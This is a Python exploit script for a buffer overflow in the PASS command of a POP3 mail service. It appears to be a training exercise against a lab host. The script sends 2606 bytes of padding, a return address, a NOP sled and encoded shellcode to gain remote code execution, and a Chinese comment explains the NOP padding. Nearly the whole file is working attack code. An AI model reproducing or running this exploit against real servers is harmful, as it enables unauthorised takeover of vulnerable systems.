#!/usr/bin/python
#coding=utf-8
import socket

shellcode = (
"\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x37\x27\x8e" + 
"\x6a\x83\xeb\xfc\xe2\xf4\xcb\x4d\x65\x27\xdf\xde\x71\x95\xc8\x47" + 
"\x05\x06\x13\x03\x05\x2f\x0b\xac\xf2\x6f\x4f\x26\x61\xe1\x78\x3f" + 
"\x05\x35\x17\x26\x65\x23\xbc\x13\x05\x6b\xd9\x16\x4e\xf3\x9b\xa3" + 
"\x4e\x1e\x30\xe6\x44\x67\x36\xe5\x65\x9e\x0c\x73\xaa\x42\x42\xc2" + 
"\x05\x35\x13\x26\x65\x0c\xbc\x2b\xc5\xe1\x68\x3b\x8f\x81\x34\x0b" + 
"\x05\xe3\x5b\x03\x92\x0b\xf4\x16\x55\x0e\xbc\x64\xbe\xe1\x77\x2b" + 
"\x05\x1a\x2b\x8a\x05\x2a\x3f\x79\xe6\xe4\x79\x29\x62\x3a\xc8\xf1" + 
"\xe8\x39\x51\x4f\xbd\x58\x5f\x50\xfd\x58\x68\x73\x71\xba\x5f\xec" + 
"\x63\x96\x0c\x77\x71\xbc\x68\xae\x6b\x0c\xb6\xca\x86\x68\x62\x4d" + 
"\x8c\x95\xe7\x4f\x57\x63\xc2\x8a\xd9\x95\xe1\x74\xdd\x39\x64\x64" + 
"\xdd\x29\x64\xd8\x5e\x02\xf7\x8f\x52\xee\x51\x4f\x8a\xd6\x51\x74" + 
"\x07\x8b\xa2\x4f\x62\x93\x9d\x47\xd9\x95\xe1\x4d\x9e\x3b\x62\xd8" + 
"\x5e\x0c\x5d\x43\xe8\x02\x54\x4a\xe4\x3a\x6e\x0e\x42\xe3\xd0\x4d" + 
"\xca\xe3\xd5\x16\x4e\x99\x9d\xb2\x07\x97\xc9\x65\xa3\x94\x75\x0b" + 
"\x03\x10\x0f\x8c\x25\xc1\x5f\x55\x70\xd9\x21\xd8\xfb\x42\xc8\xf1" + 
"\xd5\x3d\x65\x76\xdf\x3b\x5d\x26\xdf\x3b\x62\x76\x71\xba\x5f\x8a" + 
"\x57\x6f\xf9\x74\x71\xbc\x5d\xd8\x71\x5d\xc8\xf7\xe6\x8d\x4e\xe1" + 
"\xf7\x95\x42\x23\x71\xbc\xc8\x50\x72\x95\xe7\x4f\x7e\xe0\x33\x78" + 
"\xdd\x95\xe1\xd8\x5e\x6a")

def main():
	# \x90指的是nop，这里填写8个字节是为了防止ESP寄存器起始的字节丢失而造成shellcode不能正常执行的情况
	# buffer = 'A' * 2606 + "\xe3\x41\x4b\x5f" + "\x90" * 8 + shellcode
	buffer = 'A' * 2606 + "\x7b\x06\x4c\x5f" + "\x90" * 8 + shellcode

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		print "\n[*]Sending evil buffer..."
		s.connect(('192.168.220.130', 110))
		s.recv(1024)
		s.send('USER test\r\n')
		s.recv(1024)
		s.send('PASS ' + buffer + '\r\n')
		print "\n[*]Done!"
	except:
		print "[-]Can't connect to POP3 !"

if __name__ == '__main__':
	main()